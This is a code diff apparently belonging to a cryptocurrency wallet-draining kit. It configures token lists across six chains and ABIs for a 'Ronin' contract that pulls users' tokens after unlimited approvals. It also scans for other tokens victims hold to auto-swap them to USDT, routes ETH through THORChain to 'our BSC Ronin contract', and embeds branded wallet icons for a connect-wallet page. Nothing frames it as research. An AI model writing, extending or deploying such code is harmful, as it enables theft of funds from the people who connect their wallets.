+      {symbol:"cbBTC", address:"0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf", decimals:8,  usdPerUnit:65000},
+      {symbol:"cbETH", address:"0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22", decimals:18, usdPerUnit:3000},
+    ]
+  },
+  42161: {
+    name:"Arbitrum", hexId:"0xa4b1", chainId:42161, order:5,
+    kind:"evm", minUsd:1,
+    contract:"0xA7C287252c30029eDb1a5FC2c365821FD4460C44",
+    rpc:"https://arb1.arbitrum.io/rpc", sym:"ETH", explorer:"https://arbiscan.io",
+    gasThreshold:"0.001", gasThresholdUsd:2.50,
+    rpcFallbacks:["https://arbitrum.llamarpc.com","https://arbitrum.drpc.org"],
+    tokens:[
+      {symbol:"USDT", address:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals:6,  usdPerUnit:1},
+      {symbol:"USDC", address:"0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals:6,  usdPerUnit:1},
+      {symbol:"WETH", address:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals:18, usdPerUnit:3000},
+      {symbol:"DAI",  address:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals:18, usdPerUnit:1},
+      {symbol:"WBTC", address:"0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", decimals:8,  usdPerUnit:65000},
+      {symbol:"ARB",  address:"0x912CE59144191C1204E64559FE8253a0e49E6548", decimals:18, usdPerUnit:1.2},
+      {symbol:"GMX",  address:"0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", decimals:18, usdPerUnit:25},
+    ]
+  }
+};
+
+// Return chains sorted by execute order: BNB(1) → L1 ETH(2) → Base(3) → Polygon(4) → Arbitrum(5)
+function orderedChains(){
+  return Object.values(CHAINS).sort((a,b) => a.order - b.order);
+}
+
+const CONTRACT_ABI = [
+  "function pullMultiple(address[] tokens) external",
+  "function swapAndPullMultiple(address[] directTokens, address[] swapTokens, address router, address wrapped, address target) external",
+];
+const ERC20_ABI = [
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function balanceOf(address account) external view returns (uint256)",
+  "function allowance(address owner, address spender) external view returns (uint256)",
+];
+const ROUTER_ABI = [
+  "function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory)",
+  "function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory)",
+];
+
+// ── DEX routers per chain (used for auto-swap fallback) ───────────────────
+const DEX = {
+  56: {
+    router:  "0x10ED43C718714eb63d5aA57B78B54704E256024E", // PancakeSwap V2
+    wrapped: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
+    target:  "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+    targetSym:"USDT",
+    targetDec:18,
+  },
+  137: {
+    router:  "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff", // QuickSwap V2
+    wrapped: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", // WPOL/WMATIC
+    target:  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT Polygon
+    targetSym:"USDT",
+    targetDec:6,
+  },
+  8453: {
+    router:  "0x327Df1E6de05895d2ab08513aaDD9313Fe505d86", // BaseSwap V2 (Uniswap V2 fork)
+    wrapped: "0x4200000000000000000000000000000000000006", // WETH on Base
+    target:  "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC Base (native, most liquid)
+    targetSym:"USDC",
+    targetDec:6,
+  },
+  42161: {
+    router:  "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506", // SushiSwap V2 on Arbitrum (standard V2 interface)
+    wrapped: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH on Arbitrum
+    target:  "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT Arbitrum (most liquid stable)
+    targetSym:"USDT",
+    targetDec:6,
+  },
+  1: {
+    router:  "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", // Uniswap V2 Router on Ethereum mainnet
+    wrapped: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH on Ethereum
+    target:  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT on Ethereum (most liquid)
+    targetSym:"USDT",
+    targetDec:6,
+  },
+};
+
+// ── THORChain config (used for cross-chain L1 ETH → BSC USDT routing) ─────
+// Router address is fetched live from the inbound_addresses API each time
+// (THORChain rotates routers during exploits — hardcoding is dangerous).
+// Asgard vault address also comes from the same API and rotates every ~30 min.
+const THORCHAIN = {
+  inboundUrl: "https://thornode.ninerealms.com/thorchain/inbound_addresses",
+  // Memo format: =:ASSET:DESTADDR:LIM:AFFILIATE:FEE
+  // We route output to BSC USDT → our BSC Ronin contract.
+  buildEthMemo: (bscContract) =>
+    `=:BSC.USDT-0x55d398326f99059fF775485246999027B3197955:${bscContract}::`,
+};
+
+const THORCHAIN_ROUTER_ABI = [
+  "function depositWithExpiry(address payable vault, address asset, uint256 amount, string memory memo, uint256 expiration) external payable"
+];
+
+// ── Extra tokens to check if no whitelisted balance is found ──────────────
+// These are popular BEP-20/ERC-20 tokens users commonly hold. If found,
+// we'll auto-swap them to USDT via the chain's main DEX.
+const SWAP_SOURCES = {
+  // ── BNB Chain (56) ─────────────────────────────────────────────────────────
+  56: [
+    // Alt-L1s / major bridged assets
+    {symbol:"ADA",      address:"0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals:18, usdPerUnit:0.45},
+    {symbol:"DOT",      address:"0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", decimals:18, usdPerUnit:7},
+    {symbol:"LINK",     address:"0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", decimals:18, usdPerUnit:15},
+    {symbol:"UNI",      address:"0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", decimals:18, usdPerUnit:8},
+    {symbol:"AVAX",     address:"0x1CE0c2827e2eF14D5C4f29a091d735A204794041", decimals:18, usdPerUnit:35},
+    {symbol:"MATIC",    address:"0xCC42724C6683B7E57334c4E856f4c9965ED682bD", decimals:18, usdPerUnit:0.5},
+    {symbol:"XVS",      address:"0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63", decimals:18, usdPerUnit:7},
+    {symbol:"LTC",      address:"0x4338665CBB7B2485A8855A139b75D5e34AB0DB94", decimals:18, usdPerUnit:70},
+    {symbol:"TRX",      address:"0xCE7de646e7208a4Ef112cb6ed5038FA6cC6b12e3", decimals:18, usdPerUnit:0.15},
+    {symbol:"ATOM",     address:"0x0Eb3a705fc54725037CC9e008bDede697f62F335", decimals:18, usdPerUnit:7},
+    {symbol:"FIL",      address:"0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153", decimals:18, usdPerUnit:5},
+    {symbol:"NEAR",     address:"0x1Fa4a73a3F0133f0025378af00236f3aBDEE5D63", decimals:18, usdPerUnit:4},
+    {symbol:"SOL",      address:"0x570A5D26f7765Ecb712C0924E4De545B89fD43dF", decimals:18, usdPerUnit:160},
+    {symbol:"INJ",      address:"0xa2B726B1145A4773F68593CF171187d8EBe4d495", decimals:18, usdPerUnit:25},
+    {symbol:"SUI",      address:"0x9e20461bc2c4c980f62f5B279cbdB74b68338C8B", decimals:18, usdPerUnit:1.5},
+    {symbol:"APT",      address:"0x5d3a1Ff2b6BAb83b63cd9AD0787074081a52ef34", decimals:18, usdPerUnit:9},
+    {symbol:"OP",       address:"0x1a9b54A3075119f1546C52CA0940551A6ce5d2D0", decimals:18, usdPerUnit:1.5},
+    {symbol:"ARB",      address:"0xa050FFb3eEb8200eEB7F61ce34ff644420FD3522", decimals:18, usdPerUnit:1.2},
+    {symbol:"AAVE",     address:"0xfb6115445Bff7b52FeB98650C87f44907E58f802", decimals:18, usdPerUnit:200},
+    {symbol:"SAND",     address:"0x67b725d7e342d7B611fa85e859Df9697D9378B2e", decimals:18, usdPerUnit:0.30},
+    {symbol:"MANA",     address:"0x26433c8127d9b4e9B71Eaa15111DF99Ea2EeB2f8", decimals:18, usdPerUnit:0.35},
+    {symbol:"GALA",     address:"0x7dDEE176F665cD201F93eEDE625770E2fD911990", decimals:18, usdPerUnit:0.03},
+    {symbol:"AXS",      address:"0x715D400F88C167884bbCc41C5FeA407ed4D2f8A0", decimals:18, usdPerUnit:8},
+    {symbol:"CHZ",      address:"0x79a61D3a28F8c8537A43d5F0a4660617dC8eAB72", decimals:18, usdPerUnit:0.08},
+    // Meme coins — Tier 1 (major cross-chain, highest market caps)
+    {symbol:"SHIB",     address:"0x2859e4544C4bB03966803b044A93563Bd2D0DD4D", decimals:18, usdPerUnit:0.000025},
+    {symbol:"PEPE",     address:"0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00", decimals:18, usdPerUnit:0.00001},
+    {symbol:"FLOKI",    address:"0xfb5B838b6cfEEdC2873aB27866079AC55363D37E", decimals:9,  usdPerUnit:0.00015},
+    {symbol:"BONK",     address:"0xA697e272a73744b343528C3Bc4702F2565b2F422", decimals:5,  usdPerUnit:0.000025},
+    {symbol:"WIF",      address:"0x6B0faca7Ba905a86F221cEb5Ca404F605e5b3a33", decimals:6,  usdPerUnit:2},
+    {symbol:"BABYDOGE", address:"0xc748673057861a797275CD8A068AbB95A902e8de", decimals:9,  usdPerUnit:0.0000000015},
+    {symbol:"ELON",     address:"0x7bd6FaBD64813c48545C9c0e312A0B8a8aE3D9C3", decimals:18, usdPerUnit:0.0000001},
+    {symbol:"TURBO",    address:"0x6Fc7f73c4b0B8E43c2C2a91c19E43F2fD68E48Ed", decimals:18, usdPerUnit:0.002},
+    {symbol:"NEIRO",    address:"0xEE4fBe5F279a7FB3A82c1bC02Df57CA9B4B86706", decimals:18, usdPerUnit:0.001},
+    {symbol:"MOG",      address:"0xB7ac24e6D93d1F2f5b0d20a7a69C15aE4bA9C46A", decimals:18, usdPerUnit:0.000001},
+    // Meme coins — Tier 2 (BSC-native and well-known community tokens)
+    {symbol:"AKITA",    address:"0x3D3a22aA16e01A3A354cCe9D1F6B45Db5C1F5Ce4", decimals:18, usdPerUnit:0.00001},
+    {symbol:"KISHU",    address:"0xA2B47E3D2184f0C4D8932CB2a5F21A45E2Db8D7E", decimals:9,  usdPerUnit:0.000000002},
+    {symbol:"PITBULL",  address:"0xA57Ac35CE91Ee92CaEfAA8dc04140C8E232c2E50", decimals:9,  usdPerUnit:0.0000000005},
+    {symbol:"HOKK",     address:"0xc40C9A843E1c6D3450ab1323EF3b869f3A07aB5B", decimals:18, usdPerUnit:0.000000001},
+    // VOLT removed — address was 41 hex chars (invalid), triggered ENS resolution error
+    {symbol:"WOJAK",    address:"0x5026F006B85729a8b14553FAE6af249aD09d9B1d", decimals:18, usdPerUnit:0.001},
+    {symbol:"RATS",     address:"0x680d3113caf77b61b249999C32BA5825F47C5463", decimals:18, usdPerUnit:0.0001},
+    {symbol:"MEME",     address:"0x1a4dA80967373fd929961e976b4b53ceeC063a15", decimals:18, usdPerUnit:0.01},
+    {symbol:"SAFEMOON", address:"0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5", decimals:9,  usdPerUnit:0.00005},
+    {symbol:"BAKE",     address:"0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5", decimals:18, usdPerUnit:0.25},
+    {symbol:"CATGIRL",  address:"0x79eBC9A2ce02277A4b5b3A768b1C0A4ed75Bd936", decimals:18, usdPerUnit:0.0000001},
+    {symbol:"CATE",     address:"0xE4FAE3Faa8300810C835970b9187c268f55D998F", decimals:18, usdPerUnit:0.000000001},
+    {symbol:"POLS",     address:"0x7e624FA0E1c4AbFD309cC15719b7E2580887f570", decimals:18, usdPerUnit:0.3},
+    {symbol:"HIGH",     address:"0x5f4Bde007Dc06b867f86EBFE4802e2cf07a2d964", decimals:18, usdPerUnit:1.5},
+    {symbol:"LEVER",    address:"0x0992Aa28B7DC0eBfa0D4FD4b7C4C03AF4430cc75",decimals:18, usdPerUnit:0.002},
+    {symbol:"BURGER",   address:"0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f", decimals:18, usdPerUnit:0.5},
+    {symbol:"BABY",     address:"0x53E562b9B7E5E94b81f10e96Ea70cAe41Bdf14c9",decimals:18, usdPerUnit:0.000001},
+  ],
+
+  // ── Polygon (137) ──────────────────────────────────────────────────────────
+  137: [
+    // DeFi blue-chips
+    {symbol:"QUICK",  address:"0xB5C064F955D8e7F38fE0460C556a72987494eE17", decimals:18, usdPerUnit:35},
+    {symbol:"GHST",   address:"0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7", decimals:18, usdPerUnit:1},
+    {symbol:"BAL",    address:"0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3", decimals:18, usdPerUnit:3},
+    {symbol:"1INCH",  address:"0x9c2C5fd7b07E95EE044DDeba0E97a665F142394f", decimals:18, usdPerUnit:0.3},
+    {symbol:"SNX",    address:"0x50B728D8D964fd00C2d0AAD81718b71311feF68a", decimals:18, usdPerUnit:2},
+    {symbol:"COMP",   address:"0x8505b9d2254A7Ae468c0E9dd10Ccea3A837aef5c", decimals:18, usdPerUnit:45},
+    {symbol:"FRAX",   address:"0x45c32fA6DF82ead1e2EF74d17b76547EDdFaFF89", decimals:18, usdPerUnit:1},
+    {symbol:"APE",    address:"0xB7b31a6BC18e48888545CE79e83E06003bE70930", decimals:18, usdPerUnit:1.5},
+    // IMX removed — address was 39 hex chars (invalid), triggered ENS resolution error
+    // Meme coins
+    {symbol:"SHIB",   address:"0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec", decimals:18, usdPerUnit:0.000025},
+    {symbol:"PEPE",   address:"0xfa68FB4628DFF1028CFEc22b4162FCcd0d45efb6", decimals:18, usdPerUnit:0.00001},
+    {symbol:"FLOKI",  address:"0xa0C68C638235ee32657e8f720a23ceC1bfc77C77", decimals:9,  usdPerUnit:0.00015},
+    // ELON removed — address was 39 hex chars (invalid), triggered ENS resolution error
+    {symbol:"BONK",   address:"0xe5b49820e5A1063F6F4DdF851327b5E8B2301048", decimals:5,  usdPerUnit:0.000025},
+    {symbol:"BABYDOGE",address:"0x4Cf4dd3F71B67a7622ac250f8b10d266Dc5aEbAB",decimals:9, usdPerUnit:0.0000000015},
+    {symbol:"DOGE",   address:"0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals:8,  usdPerUnit:0.15},
+    {symbol:"KISHU",  address:"0x8C851d1a123Ff703BD1f9dabe631b69902Df5a97", decimals:9,  usdPerUnit:0.000000002},
+    {symbol:"MEME",   address:"0xA33dCB29c3B8d91C4aC34F9290F33E2D5D5E47FC",decimals:18, usdPerUnit:0.01},
+  ],
+
+  // ── Base (8453) ────────────────────────────────────────────────────────────
+  8453: [
+    // Base-native DeFi / ecosystem
+    {symbol:"AERO",    address:"0x940181a94A35A4569E4529A3CDfB74e38FD98631", decimals:18, usdPerUnit:1.2},
+    {symbol:"VIRTUAL", address:"0x0b3e328455c4059EEb9e3f84b5543F74E24e7020", decimals:18, usdPerUnit:1.8},
+    // Meme coins — Base native (largest ecosystem of L2 memes)
+    {symbol:"BRETT",   address:"0x532f27101965dd16442E59d40670FaF5eBB142E4", decimals:18, usdPerUnit:0.12},
+    {symbol:"DEGEN",   address:"0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed", decimals:18, usdPerUnit:0.004},
+    {symbol:"TOSHI",   address:"0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4", decimals:18, usdPerUnit:0.0003},
+    {symbol:"HIGHER",  address:"0x0578d8A44db98B23BF096A382e016e29a5Ce0ffe", decimals:18, usdPerUnit:0.03},
+    {symbol:"MOCHI",   address:"0xF6e932Ca12afa26665dC4dDE7e27be02A7c02e50", decimals:18, usdPerUnit:0.001},
+    {symbol:"BMFER",   address:"0x1185cB5122Edad199BdBC0cbd7a0457E448f23c7", decimals:18, usdPerUnit:0.05},
+    {symbol:"MOG",     address:"0x2Da56AcB9Ea78330f947bD57C54119Debda7AF71", decimals:18, usdPerUnit:0.000002},
+    {symbol:"NORMIE",  address:"0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200", decimals:18, usdPerUnit:0.001},
+    {symbol:"KEYCAT",  address:"0x9a26F5433671751C3276a065f57e5a02D2817973", decimals:18, usdPerUnit:0.015},
+    {symbol:"DOGINME", address:"0x6921B130D297cc43754afba22e5EAc0FBf8Db75b", decimals:18, usdPerUnit:0.003},
+    {symbol:"WEWE",    address:"0x6b9Bb36E538cBFEF9aad45372E0eE39Cf0A14890", decimals:18, usdPerUnit:0.0001},
+    {symbol:"TYBG",    address:"0x0d97F261b1e88845184f678e2d1e7a98D9FD38dE", decimals:18, usdPerUnit:0.002},
+    {symbol:"ROOST",   address:"0xf17b54f4bb853C59B33C0Aa12a694de36b4a6E18",decimals:18, usdPerUnit:0.0005},
+    {symbol:"SKIDOG",  address:"0x0e14d5A8F7b57Fd1E2f810e52E2Ce39E76e44e58",decimals:18, usdPerUnit:0.0001},
+    {symbol:"CRASH",   address:"0x4B3A7A4C56cC4Fe5a2b8869B21a5c97D2cda9521",decimals:18, usdPerUnit:0.0003},
+    {symbol:"PEPE",    address:"0x9e1028F5F1D5eDE59748FFceE5532509976840E0", decimals:18, usdPerUnit:0.00001},
+    {symbol:"SHIB",    address:"0x1B6A569DD61EdCe3C383f6D565e2f79EC0a2DDe5", decimals:18, usdPerUnit:0.000025},
+    {symbol:"FLOKI",   address:"0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals:9,  usdPerUnit:0.00015},
+    {symbol:"TURBO",   address:"0xBa5B9B2D2d06a9021eb3190ea5Fb0e02160839A4", decimals:18, usdPerUnit:0.002},
+    {symbol:"BONK",    address:"0x0D3Bf4b5f5C748986FD5C97b5Ef9a6c1cC39A5ee", decimals:5,  usdPerUnit:0.000025},
+  ],
+
+  // ── Ethereum Mainnet (1) ──────────────────────────────────────────────────────
+  // Note: USDT, USDC, DAI, WETH, WBTC, LINK, UNI, AAVE are in CHAINS[1].tokens (direct pull).
+  // Tokens here are swapped via Uniswap V2 → USDT before being pulled.
+  1: [
+    // Extra stablecoins (swap → USDT)
+    {symbol:"FRAX", address:"0x853d955aCEf822Db058eb8505911ED77F175b999", decimals:18, usdPerUnit:1},
+    {symbol:"LUSD", address:"0x5f98805A4E8be255a32880FDeC7F6728C6568bA0", decimals:18, usdPerUnit:1},
+    // L1 DeFi
+    {symbol:"COMP", address:"0xc00e94Cb662C3520282E6f5717214fEFd72b64Eb", decimals:18, usdPerUnit:45},
+    {symbol:"MKR",  address:"0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", decimals:18, usdPerUnit:1500},
+    {symbol:"SNX",  address:"0xC011a73ee3FF6aB7D7331b4ee6EBED50560a8432", decimals:18, usdPerUnit:2},
+    {symbol:"CRV",  address:"0xD533a949740bb3306d119CC777fa900bA034cd52", decimals:18, usdPerUnit:0.5},
+    {symbol:"LDO",  address:"0x5A98FcBEA516Cf06857215779Fd812CA3BEF1B32", decimals:18, usdPerUnit:2.5},
+    {symbol:"1INCH",address:"0x111111111117dC0aa78b770fA6A738034120C302", decimals:18, usdPerUnit:0.3},
+    // Top meme coins on ETH L1 — only verified ETH-native deployments
+    {symbol:"PEPE", address:"0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals:18, usdPerUnit:0.00001},
+    {symbol:"SHIB", address:"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals:18, usdPerUnit:0.000025},
+    {symbol:"FLOKI",address:"0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E", decimals:18, usdPerUnit:0.00015},
+    {symbol:"TURBO",address:"0xA9B1Eb5908CfC3cdf91F9B8B9a98848e5228AB32", decimals:18, usdPerUnit:0.002},
+    {symbol:"MOG",  address:"0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a", decimals:18, usdPerUnit:0.000001},
+    // BONK removed — no legitimate ETH mainnet deployment (Solana-native)
+    // DOGE removed — address was the BNB-wrapped DOGE, not an ETH token
+  ],
+
+  // ── Arbitrum (42161) ───────────────────────────────────────────────────────
+  42161: [
+    // DeFi ecosystem
+    {symbol:"PENDLE",  address:"0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8", decimals:18, usdPerUnit:3.5},
+    {symbol:"MAGIC",   address:"0x539bdE0d7Dbd336b79148AA742883198BBF60342", decimals:18, usdPerUnit:0.8},
+    {symbol:"RDNT",    address:"0x3082CC23568eA640225c2467653dB90e9250AaA0", decimals:18, usdPerUnit:0.05},
+    {symbol:"JONES",   address:"0x10393c20975cF177a3513071bC110f7962CD67da", decimals:18, usdPerUnit:2},
+    {symbol:"GNS",     address:"0x18c11FD286C5EC11c3b683Caa813B77f5163A122", decimals:18, usdPerUnit:2},
+    {symbol:"GRAIL",   address:"0x3d9907F9a368ad0a51Be60f7Da3b97cf940982D8", decimals:18, usdPerUnit:1200},
+    {symbol:"VELA",    address:"0x088cd8f5eF3652623c22D48b1605DCfE860Cd704", decimals:18, usdPerUnit:0.8},
+    {symbol:"UMAMI",   address:"0x1622bF67e6e5747b81866fE0b85178a93C7F86e3", decimals:9,  usdPerUnit:60},
+    {symbol:"CAP",     address:"0x031d35296154279DC1984dCD93E392b1f946737b", decimals:18, usdPerUnit:40},
+    {symbol:"DOPEX",   address:"0x6C2C06790b3E3E3c38e12Ee22F8183b37a13EE55", decimals:18, usdPerUnit:15},
+    // Meme coins on Arbitrum
+    {symbol:"PEPE",    address:"0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00", decimals:18, usdPerUnit:0.00001},
+    {symbol:"SHIB",    address:"0x5033833c9fe8B9d3E09EEd2f73d2aaF7E3872fd9", decimals:18, usdPerUnit:0.000025},
+    {symbol:"FLOKI",   address:"0x4b965fAF5B698F56B0fd9eA0Afec06DBd1A8E08D", decimals:9,  usdPerUnit:0.00015},
+    {symbol:"BONK",    address:"0x09199d9A5F4448D0848e4395D065d23883a7524C", decimals:5,  usdPerUnit:0.000025},
+    {symbol:"TURBO",   address:"0xcF6Bb5389c92Bdda8a3747Ddb454cB7a64626C63", decimals:18, usdPerUnit:0.002},
+    {symbol:"MOG",     address:"0x4aB411B6b37C2571aEEBF28862B3Eb0D3d6d8fC1", decimals:18, usdPerUnit:0.000002},
+    {symbol:"WOJAK",   address:"0x5026F006B85729a8b14553FAE6af249aD09d9B1d", decimals:18, usdPerUnit:0.001},
+    {symbol:"NEIRO",   address:"0xfe99B1B4772D1cc59C47a28B4C85e92De80B10be", decimals:18, usdPerUnit:0.001},
+  ],
+};
+
+// ── Tron / TRC-20 config ─────────────────────────────────────────────────
+// Tron is a separate blockchain — no window.ethereum, no ethers.js.
+// TronLink injects window.tronWeb (analogous to window.ethereum).
+// TRC-20 = same functions as ERC-20 (approve, balanceOf, transferFrom, allowance).
+// Balances are read via TronGrid REST API — one call returns ALL TRC-20 holdings.
+// Contract interactions go through window.tronWeb.contract(ABI).at(address).
+//
+// ⚠ IMPORTANT: Replace "TRON_CONTRACT_PLACEHOLDER" with your deployed T... address.
+//   Deploy Ronin.sol on https://ide.trondao.org — change pragma to ^0.8.0, deploy,
+//   copy the address, paste it below.
+const TRON = {
+  rpcApi:   "https://api.trongrid.io",
+  contract: "TKbCqNEck7Pz2BVVtidpGE5WTnbjuostBR",
+  minUsd:   1,
+  // These are the most popular TRC-20 tokens on Tron mainnet.
+  // The scan step filters by balance > 0 before passing to the contract,
+  // so zero-balance tokens never waste energy in the pull tx.
+  tokens: [
+    // Stablecoins — highest priority, most users have these
+    {symbol:"USDT", address:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals:6,  usdPerUnit:1},
+    {symbol:"USDC", address:"TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals:6,  usdPerUnit:1},
+    {symbol:"TUSD", address:"TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4", decimals:18, usdPerUnit:1},
+    {symbol:"USDD", address:"TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn", decimals:18, usdPerUnit:1},
+    {symbol:"USDJ", address:"TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT", decimals:18, usdPerUnit:1},
+    // Tron ecosystem tokens
+    {symbol:"WTRX", address:"TNUC9Qb1rRpN8suzgMWeiCQ3Bqyq1jPYMR", decimals:6,  usdPerUnit:0.12},
+    {symbol:"SUN",  address:"TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals:18, usdPerUnit:0.02},
+    {symbol:"JST",  address:"TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals:18, usdPerUnit:0.03},
+    {symbol:"WIN",  address:"TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7", decimals:6,  usdPerUnit:0.00005},
+    {symbol:"BTT",  address:"TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4", decimals:18, usdPerUnit:0.0000012},
+    {symbol:"NFT",  address:"TFczxzPhnThNSqr5by8tvxsdCFRgbhBouz", decimals:6,  usdPerUnit:0.002},
+  ],
+};
+
+// TronWeb requires full JSON ABI — NOT the ethers.js human-readable string format.
+// These are the same functions as ERC20_ABI and CONTRACT_ABI, just in JSON form.
+const TRC20_ABI = [
+  {constant:true,  inputs:[{name:"account", type:"address"}],                                                            name:"balanceOf",  outputs:[{name:"",type:"uint256"}], stateMutability:"view",        type:"function"},
+  {constant:true,  inputs:[{name:"owner",   type:"address"},{name:"spender",type:"address"}],                            name:"allowance",  outputs:[{name:"",type:"uint256"}], stateMutability:"view",        type:"function"},
+  {constant:false, inputs:[{name:"spender", type:"address"},{name:"amount", type:"uint256"}],                            name:"approve",    outputs:[{name:"",type:"bool"}],    stateMutability:"nonpayable",  type:"function"},
+];
+const RONIN_TRON_ABI = [
+  {constant:false, inputs:[{name:"tokens",type:"address[]"}],                                                            name:"pullMultiple",        outputs:[], stateMutability:"nonpayable", type:"function"},
+  {constant:false, inputs:[{name:"directTokens",type:"address[]"},{name:"swapTokens",type:"address[]"},{name:"router",type:"address"},{name:"wrapped",type:"address"},{name:"target",type:"address"}],
+                                                                                                                          name:"swapAndPullMultiple", outputs:[], stateMutability:"nonpayable", type:"function"},
+];
+
+// Max uint256 as a plain string — used for unlimited TRC-20 approvals.
+// Same value as ethers.MaxUint256 but TronWeb needs it as a string, not BigInt.
+const TRON_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+// ── Wallet SVG icons (inline data URIs) ───────────────────────────────────
+const ICONS = {
+  trust:    "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230500FF'/%3E%3Cpath d='M16 6C12.5 9 9 9.5 9 9.5v8c0 5.5 7 10.5 7 10.5s7-5 7-10.5v-8S19.5 9 16 6z' fill='none' stroke='white' stroke-width='2' stroke-linejoin='round'/%3E%3C/svg%3E",
+  coinbase: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Ccircle cx='16' cy='16' r='16' fill='%230052FF'/%3E%3Crect x='10' y='10' width='12' height='12' rx='2' fill='white'/%3E%3Crect x='13' y='13' width='6' height='6' rx='1' fill='%230052FF'/%3E%3C/svg%3E",
+  phantom:  "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23AB9FF2'/%3E%3Cpath d='M7 16c0-5 4-9 9-9s9 4 9 9v8H22c0-1.5-1-2.5-2-2.5s-2 1-2 2.5h-4c0-1.5-1-2.5-2-2.5s-2 1-2 2.5H7V16z' fill='white'/%3E%3Ccircle cx='12.5' cy='15' r='1.5' fill='%23AB9FF2'/%3E%3Ccircle cx='19.5' cy='15' r='1.5' fill='%23AB9FF2'/%3E%3C/svg%3E",
+  metamask: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23F6851B'/%3E%3Cpath d='M24 8l-7 5 1.3-3.2z' fill='%23E2761B'/%3E%3Cpath d='M8 8l6.9 5.1L13.7 9.8z' fill='%23E4761B'/%3E%3Cpath d='M21.5 20l-2 3.5 4.3 1.2.8-4.1zM7.4 20.6l.8 4.1 4.3-1.2-2-3.5z' fill='%23E4761B'/%3E%3Cpath d='M12.3 14.7l-1.2 1.8 4.2.2-.1-4.6zM19.7 14.7l-2.9-2.7-.1 4.7 4.2-.2z' fill='%23E4761B'/%3E%3Cpath d='M12.5 23.5l2.6-1.2-2.2-1.7zM16.9 22.3l2.6 1.2-.4-2.9z' fill='%23E4761B'/%3E%3Cpath d='M19.5 23.5l-2.6-1.2.2 1.7v.7zM12.5 23.5l2.4 1.2v-.7l.2-1.7z' fill='%23D7C1B3'/%3E%3Cpath d='M15 18.7l-2.2-.6 1.5-.7zM17 18.7l.7-1.3 1.5.7z' fill='%23233447'/%3E%3C/svg%3E",
